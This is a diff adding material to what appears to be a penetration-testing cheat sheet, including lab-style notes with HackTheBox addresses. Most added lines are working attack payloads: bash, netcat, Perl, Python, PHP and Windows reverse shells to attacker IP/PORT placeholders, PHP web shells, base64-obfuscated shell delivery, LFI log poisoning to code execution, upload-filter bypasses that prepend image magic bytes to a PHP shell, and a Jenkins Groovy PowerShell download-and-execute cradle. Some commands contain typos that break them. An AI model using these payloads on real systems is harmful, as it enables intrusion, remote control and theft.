@@ -207,6 +207,7 @@
 | Wfuzz | https://github.com/xmendez/wfuzz |
 | WhatWeb | https://github.com/urbanadventurer/WhatWeb |
 | WPScan | https://github.com/wpscanteam/wpscan |
+| Davtest | https://github.com/cldrn/davtest |
 
 ### Database Assessment
 
@@ -502,6 +503,7 @@ curl --path-as-is http://<DOMAIN>/../../../../../../etc/passwd                 /
 curl --proxy http://127.0.0.1:8080                                             // use proxy
 curl -F myFile=@<FILE> http://<RHOST>                                          // file upload
 curl${IFS}<LHOST>/<FILE>                                                       // Internal Field Separator (IFS) example
+curl -I -X OPTIONS http://IP/Pagina/                                           // Check accepted methods
 ```
 
 #### File Transfer
@@ -1542,6 +1544,34 @@ export TERM=xterm-256color
 bash
 ```
 
+or
+
+```c
+Victim:
+script /dev/null -c bash
+ + Ctr Z
+
+Attacker:  
+stty raw -echo; fg
+reset
+Enter → even if its not seing
+
+Victim:
+reset
+xterm
+echo $TERM → not changed so: 
+export TERM=xterm
+export SHELL=bash
+
+Proportions of attacker machine	e
+stty -a
+Check numer of columns and rows
+	
+stty rows XX columns YY
+
+	stty rows 53 columns 161
+```
+
 Alternatively:
 
 ```c
@@ -2023,6 +2053,38 @@ http://<RHOST>/<FILE>.php?file=
 http://<RHOST>/<FILE>.php?file=../../../../../../../../etc/passwd
 http://<RHOST>/<FILE>/php?file=../../../../../../../../../../etc/passwd
 ```
+###### Log Poissoning
+
+
+LFI→ LOG POSSOINING→ RCE
+Log stored path:
+/var/log/httpd-access.log
+/ssh →  var/log/auth.log
+
+```c
+ssh '<?php system("whoami"); ?>'@IP 
+```
+
+User agent header:
+
+```c
+ import requests
+ headers= {'User-Agent': "<?php system("whoami"); ?>"}
+ r=requests.get("http://IP, headers=headers")
+```
+In the httpd log storage the result will appear
+ Obtain code:
+ headers= {'User-Agent': "<?php system($_REQUEST['cmd']); ?>"}
+ Execute commands in the url 
+
+```c
+&cmd=COMMANDO
+```
+Para  obtener una shell
+```c
+&cmd=SHELL
+```
+
 ##### Until php 5.3
 
 ```c
@@ -2628,6 +2690,12 @@ wfuzz -w /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt --hw 31 ht
 wfuzz -u 'http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/FUZZ/cmdline' -z range,900-1000
 ```
 
+##### Cookies
+
+```c
+wfuzz -H 'Cookie: COKIE'
+```
+
 #### WPScan
 
 ```c
@@ -2636,6 +2704,11 @@ wpscan --url https://<RHOST> --plugins-detection aggressive
 wpscan --url https://<RHOST> --disable-tls-checks
 wpscan --url https://<RHOST> --disable-tls-checks --enumerate u,t,p
 wpscan --url http://<RHOST> -U <USERNAME> -P passwords.txt -t 50
+```
+Certificate information
+
+```c
+openssl s_client -connect IP:PORT  
 ```
 
 #### XML External Entity (XXE)
@@ -2669,6 +2742,211 @@ Content-Length: 136
 
 ```c
 username=%26username%3b&version=1.0.0--><!DOCTYPE+username+[+<!ENTITY+username+SYSTEM+"/root/.ssh/id_rsa">+]><!--
+```
+
+##### Shells on Web
+
+###### Linux
+With sanitization
+```c
+echo "BASE64_code" | base64 -d | bash
+```
+
+```c
+echo "bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'" | base64 -w 0
+```
+
+```c
+echo CODE |base64 -d | bash
+```
+
+```c
+cat /etc/hosts
+```
+
+```c
+cat /e??/host?
+? used for autocompletion
+```
+  
+```c
+ /bin/n? -e /bin/bas?/ 
+```
+
+###### PHP
+
+```c
+<?php
+			echo -e '#!/bin/bash\n\nbash -e >& /dev/tcp/IP/PORT 0>&1'
+?>
+```
+
+```c
+<?php
+			system('rm /tmp/f;mkfilo /tmp/f;cat /tmp/f|/bin/sh -i 2>1|nc IP PORT >/tmp/f');
+?>
+```
+
+```c
+php --interactive
+urlencode("SHELL")
+```
+
+```c
+<?php
+			system('bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"')
+?>
+```
+
+```c
+<?php 
+			echo shell_exec("/usr/local/bin/wget http://IP:PORT/php-reverse-shell.php -O /var/tmp/shell.php 2>&1");
+?>
+```
+
+```c
+<?php exec("wget -O /var/www/htlm/shell.php http://IP/t.php"); ?>
+```
+
+```c
+<?php system($_REQUEST['cmd']);?>
+```
+
+```c
+<?php
+			echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
+?>
+```
+
+###### IPV6
+
+```c
+bash -i >i /dev/tcp/IPV6/PORT 0>&1
+```
+
+###### Linux
+
+```c
+nc -c bash 10.10.14.6 444
+```
+
+```c
+'/bin/bash -i > /dev/tcp/'.$ip.'/'.$port.' 0<&1 2>&1'
+```
+
+URL-Encode
+
+```c
+?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/IP/PORT%200%3E%261%22
+```
+
+In url → http://IP/uploads/FILE.php.png?cmd=whoami
+
+```c
+?cmd=nc -e /bin/bash IP PORT
+```
+
+```c
+'/usr/bin/nc '.$ip.' '.$port.' -e /bin/bash'
+```
+
+```c
+bash -i >& /dev/tcp/IP/PORT 0>&1
+```
+
+```c
+?cmd=bash -c "bash -i >%26 /dev/tcp/IP/PORT 0>%261"
+```
+
+```c
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP POrt >/tmp/f
+system("rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+IP+PORT+>/tmp/f")%3b&text=x
+```
+
+```c
+ '0<&196;exec 196<>/dev/tcp/'.$ip.'/'.$port.'; /bin/sh <&196 >&196 2>&196',
+```
+
+```c
+/usr/local/bin/wget http://10.10.14.8:8000/rev.php -O /var/tmp/shell.php 2>&1
+```
+
+###### Windows
+
+```c
+nc.exe -e cmd 10.10.14.6 443
+nc.exe%20-e%20cmd%20IP%20PORT
+```
+
+```c
+?cmd=cmd.exe -i >& /dev/tcp/IP/PORT 0>&1
+```
+
+```c
+nc.exe -nv '.$ip.' '.$port.' -e cmd.exe'
+```
+
+###### Perl
+
+```c
+  "/usr/bin/perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"".$ip.":".$port."\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
+    'perl -e \'use Socket;$i="'.$ip.'";$p='.$port.';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\''
+    
+    perl -e 'use Socket;$i="10.10.14.6";$p=444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+```
+
+###### Telnet
+
+```c
+'rm -f /tmp/p; mknod /tmp/p p && telnet '.$ip.' '.$port.' 0/tmp/p'
+```
+
+###### Python
+
+```c
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.6",444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+
+###### File to shell File Bypass
+
+Cheks
+•  uploading .php file instead of jpg file.
+•  double extensions to bypass and upload php file pic.jpg.php or pic.php.jpg php.png
+•  Changing Content-type filtering i.e., changing Content-Type: txt/php to image/jpg
+•  Case sensitives — pic.PhP also tried pic.php5, pHP5.
+•  Special characters to bypass pic.php%00 , pic.php%0a, pic.php%00. Add null byte (%00) on filename
+•  Content-Type of an imagen and php code 
+
+Magic numbers
+
+https://gist.github.com/leommoore/f9e57ba2aa4bf197ebc5
+
+Magic bytes: → JPEG 
+
+```c
+ff d8 ff e0
+```
+
+```c
+head -c 20 FILE | xdd
+xxd test.zip | head
+```
+
+Create a revershell php with magic number de png
+
+```c
+head -c 20 FILE.png  > pngMagicnumbers
+```
+
+```c
+cat pngMagicnumbers shell.php > magicShell.php
+```
+
+In Burp 
+
+```c
+Content-Disposition: form-data; name="image"; filename="phprev.jpeg"
+Content-Type: application/x-php
 ```
 
 ### Database Analysis
@@ -8760,6 +9038,15 @@ String host="<LHOST>";
 int port=<LPORT>;
 String cmd="/bin/bash";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+```
+
+##### Manage Jenkins command line
+
+```c
+command = "\\IP\smbFolder\nc.exe -e cmd IP PORT"
+def command = "powershell -c iex(new-object net.webclient).downloadstring('http://IP:Port/Ps.ps1')"
+def proc = command.execute()
+println(proc.in.text)
 ```
 
 ##### JAVA Reverse Shell
